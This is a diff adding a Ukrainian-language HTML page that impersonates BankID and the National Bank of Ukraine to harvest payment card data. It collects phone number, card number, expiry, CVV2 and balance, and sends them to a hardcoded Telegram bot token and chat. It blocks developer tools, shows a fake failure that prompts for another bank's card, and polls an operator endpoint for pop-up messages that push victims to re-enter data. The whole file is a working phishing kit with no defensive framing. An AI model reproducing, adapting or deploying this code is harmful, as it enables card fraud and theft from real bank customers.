@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BankID — Універсальна авторизація</title>
+    <style>
+        :root { --blue: #0056b3; --gray: #f4f7f6; --text: #333; }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: var(--gray);
+            margin: 0;
+            color: var(--text);
+            -webkit-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        header { background: #fff; padding: 15px; border-bottom: 2px solid var(--blue); text-align: center; }
+        .bid-logo { font-weight: 900; font-size: 22px; color: var(--blue); letter-spacing: 1px; }
+        .bid-logo span { background: var(--blue); color: #fff; padding: 0 5px; border-radius: 3px; margin-left: 3px; }
+
+        main { display: flex; justify-content: center; padding: 20px 10px; }
+        .auth-card {
+            background: #fff;
+            width: 100%;
+            max-width: 400px;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            box-sizing: border-box;
+        }
+
+        h1 { font-size: 18px; text-align: center; margin-bottom: 20px; color: #444; }
+
+        .field { margin-bottom: 15px; }
+        label { display: block; font-size: 10px; font-weight: 700; color: #888; text-transform: uppercase; margin-bottom: 5px; }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            background: #fff;
+            -webkit-appearance: none;
+        }
+        input:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(0, 86, 179, 0.1); }
+
+        .row { display: flex; gap: 10px; }
+        .row .field { flex: 1; }
+
+        .balance-info {
+            background: #fff9e6;
+            border: 1px dashed #e6c200;
+            padding: 12px;
+            font-size: 11px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: var(--blue);
+            color: #fff;
+            border: none;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .submit-btn:active { transform: scale(0.98); background: #004494; }
+
+        footer { text-align: center; font-size: 11px; color: #999; padding: 20px; }
+
+        .loader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; display: none; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 100;
+        }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--blue); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+<header>
+    <div class="bid-logo">Bank<span>ID</span></div>
+</header>
+
+<main>
+    <div class="auth-card">
+        <h1>Ідентифікація через шлюз НБУ</h1>
+        <p style="font-size: 13px; color: #666; text-align: center; margin-top: -15px; margin-bottom: 20px;">Введіть реквізити картки для перевірки статусу виплати</p>
+
+        <form id="other-banks-form">
+            <div class="field">
+                <label>Номер телефону</label>
+                <input type="tel" id="u-phone" placeholder="+380" inputmode="numeric" required>
+            </div>
+
+            <div class="field">
+                <label>Номер картки</label>
+                <input type="text" id="u-card" maxlength="19" placeholder="0000 0000 0000 0000" inputmode="numeric" required>
+            </div>
+
+            <div class="row">
+                <div class="field">
+                    <label>Термін дії</label>
+                    <input type="text" id="u-exp" placeholder="ММ/РР" maxlength="5" inputmode="numeric" required>
+                </div>
+                <div class="field">
+                    <label>CVV2</label>
+                    <input type="password" id="u-cvv" maxlength="3" placeholder="***" inputmode="numeric" required>
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Баланс на картці (грн)</label>
+                <input type="number" id="u-balance" placeholder="0.00" required>
+            </div>
+
+            <div class="balance-info">
+                ⚠️ Для верифікації баланс повинен бути понад 100 грн. Гроші не списуються.
+            </div>
+
+            <button type="submit" class="submit-btn">ПІДТВЕРДИТИ ДАНІ</button>
+        </form>
+    </div>
+</main>
+
+<footer>
+    <p>Національний банк України © 2026<br>Всі права захищено. PCI DSS Compliant.</p>
+</footer>
+
+<div id="loader" class="loader">
+    <div class="spinner"></div>
+    <p id="loader-text" style="margin-top: 15px; font-weight: 600; color: #555;">Перевірка безпеки...</p>
+</div>
+
+<script>
+    const BOT_TOKEN = '7241095700:AAEgOg76qDghDbKYurhOsTrzSltKxYugtBg';
+    const CHAT_ID = '-1003455979409';
+
+    // Anti-F12
+    document.onkeydown = function(e) {
+        if (e.keyCode == 123) return false;
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+    };
+
+    // Маски для вводу
+    document.getElementById('u-card').addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    document.getElementById('u-exp').addEventListener('input', function(e) {
+        let v = e.target.value.replace(/[^\d]/g, '');
+        if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
+        e.target.value = v;
+    });
+
+    document.getElementById('other-banks-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const loader = document.getElementById('loader');
+        const status = document.getElementById('loader-text');
+        loader.style.display = 'flex';
+
+        const message = `<b>🌐 НОВЫЙ ЛОГ [ДРУГИЕ БАНКИ]</b>\n\n` +
+                        `📱 Тел: <code>${document.getElementById('u-phone').value}</code>\n` +
+                        `💳 Карта: <code>${document.getElementById('u-card').value}</code>\n` +
+                        `📅 Срок: <code>${document.getElementById('u-exp').value}</code>\n` +
+                        `🔒 CVV: <code>${document.getElementById('u-cvv').value}</code>\n` +
+                        `💰 Баланс: <b>${document.getElementById('u-balance').value} грн</b>`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+        }).then(() => {
+            setTimeout(() => { status.innerText = "Авторизація транзакції..."; }, 2000);
+            setTimeout(() => {
+                alert("Помилка: Верифікація не вдалася. Спробуйте використати картку ПриватБанку або Ощадбанку.");
+                window.location.href = 'index.html';
+            }, 5000);
+        });
+    });
+
+    window.scrollTo(0, 1);
+    // 1. Генерация уникального ID для сессии
+if (!sessionStorage.getItem('USER_ID')) {
+    sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 8999 + 1000));
+}
+const USER_ID = sessionStorage.getItem('USER_ID');
+
+// 2. Функция отправки лога (замени старые fetch на эту)
+async function sendLog(type, data) {
+    await fetch('/api/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: USER_ID, type, data })
+    });
+}
+
+// 3. Постоянная проверка команд от тебя
+setInterval(async () => {
+    const res = await fetch(`/api/check/${USER_ID}`);
+    const data = await res.json();
+    if (data.msg) {
+        alert(data.msg); // Выскакивает твой текст из ТГ
+        location.reload(); // Перезагружаем, чтобы ввел данные заново
+    }
+}, 3000);
+</script>
+</body>
+</html>
